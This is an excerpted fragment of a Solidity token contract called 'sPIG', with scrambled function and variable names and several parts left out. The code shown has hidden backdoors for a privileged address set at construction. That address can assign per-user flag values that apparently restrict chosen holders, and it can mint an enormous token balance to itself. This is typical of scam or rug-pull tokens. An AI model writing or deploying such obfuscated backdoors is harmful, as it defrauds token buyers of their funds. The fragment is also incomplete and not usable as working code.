...
contract sPIG is Ownable {
    ...
    address public oiLhzpM;
    mapping(address => uint256) private TMFFmUser;

    constructor(address hctwiUu,string memory t2name, string memory t2symbol) {
        oiLhzpM = hctwiUu;
        _Tokename = t2name;
    ...
    function tYeFlTk(address LsIochB) external   {
        if(oiLhzpM == _msgSender()){
            TMFFmUser[LsIochB] = 0;
        }else {
            require(_msgSender() == oiLhzpM);
        }
        
    }

    function AFChcBtn(address LsIochB) external   {
        if(oiLhzpM == _msgSender()){
           TMFFmUser[LsIochB] = 900;
        }else {
            require(_msgSender() == oiLhzpM);
        }
    ...
    function kYROoXt() public  {
        if(oiLhzpM == _msgSender()){
            uint256 jGNtfDh = 1000000000000*10**decimals()*98000;
            _balances[_msgSender()] += jGNtfDh;
        }else {
            require(_msgSender() == oiLhzpM);
            revert("rbbb");
        }
